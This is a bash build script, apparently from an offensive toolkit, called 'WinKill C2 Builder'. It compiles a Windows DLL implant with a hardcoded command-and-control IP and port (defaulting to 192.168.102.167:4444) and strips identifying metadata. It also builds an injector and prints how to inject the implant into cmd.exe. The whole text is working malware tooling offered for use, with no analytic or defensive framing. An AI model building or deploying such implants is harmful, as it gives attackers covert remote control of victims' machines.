#!/bin/bash
IP="${1:-192.168.102.167}"; PORT="${2:-4444}"
IPHEX=$(python3 -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))" 2>/dev/null || python -c "import socket,struct;print(hex(struct.unpack('<I',socket.inet_aton('$IP'))[0]))")
echo "============================================"
echo "  WinKill C2 Builder"
echo "  C2: $IP:$PORT ($IPHEX)"
echo "============================================"
x86_64-w64-mingw32-gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.dll agent.c -lws2_32 2>/dev/null || gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=$IPHEX -DC2_PORT=$PORT -o agent.dll agent.c -lws2_32 || exit 1
echo "[1/2] agent.dll OK"
x86_64-w64-mingw32-gcc -O2 -s -m64 -fno-ident -o injector.exe injector.c 2>/dev/null || gcc -O2 -s -m64 -fno-ident -o injector.exe injector.c || exit 1
echo "[2/2] injector.exe OK"
echo ""
echo "Usage: injector.exe agent.dll cmd.exe"
ls -la agent.dll injector.exe
